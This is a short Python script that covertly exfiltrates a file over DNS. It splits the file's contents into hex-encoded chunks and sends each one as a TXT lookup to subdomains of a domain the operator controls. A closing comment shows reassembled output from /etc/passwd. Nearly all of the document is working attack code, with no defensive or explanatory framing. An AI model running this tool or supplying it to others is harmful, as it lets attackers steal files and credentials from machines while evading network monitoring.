#!/usr/bin/env python3

import dns.resolver
import binascii
import argparse
import random
import string

parser = argparse.ArgumentParser()
parser.add_argument('--domain','-d',required=True)
parser.add_argument('--file','-f',required=True)
args = parser.parse_args()

def break_line(string, length):
	"""split the file line into chunks that can fit into dns query"""
	return (string[0+i:length+i] for i in range(0, len(string), length))

def random_string_digits(string_length=4):
	"""generate a random alpha-num string for file identifier""" 
	letters_and_digits = string.ascii_letters + string.digits
	return ''.join(random.choice(letters_and_digits) for i in range(string_length))

def make_query(missing_piece):
	"""create a csv of data to piece together later"""
	string = ("%s,%s,%s\n"%(file_id,f'{num:05}',missing_piece))
	"""serialize the data"""
	encoded_string = binascii.hexlify(string.encode('utf-8'))
	"""put together the dns query"""
	tld = ("d.%s.%s.%s"%(encoded_string.decode('utf-8'),file_id,args.domain))
	"""do it!"""
	try:
		dns.resolver.query(tld,'TXT')
	except:
		pass

file_id =  random_string_digits()
num = 1

'''parse out a file name and create a header for data transfer'''
for header in break_line(args.file,19):
	make_query(header)
	num += 1

with open (args.file,"r") as work_file:
	for line in work_file:
		for piece in break_line(line.rstrip(),19):
			make_query(piece)
			num += 1
work_file.close()
exit()

"""
data received will be in the format:

	file_id,sequence_number,data

	ex.
	R9TS,00001,/etc/passwd
	...
	R9TS,00026,nobody:*:-2:-2:U
	R9TS,00026,nobody:*:-2:-2:U
	R9TS,00027,nprivileged User
	R9TS,00027,nprivileged User
	R9TS,00028,:/var/empty:/usr
	R9TS,00028,:/var/empty:/usr
	R9TS,00029,/bin/false
	R9TS,00029,/bin/false

"""
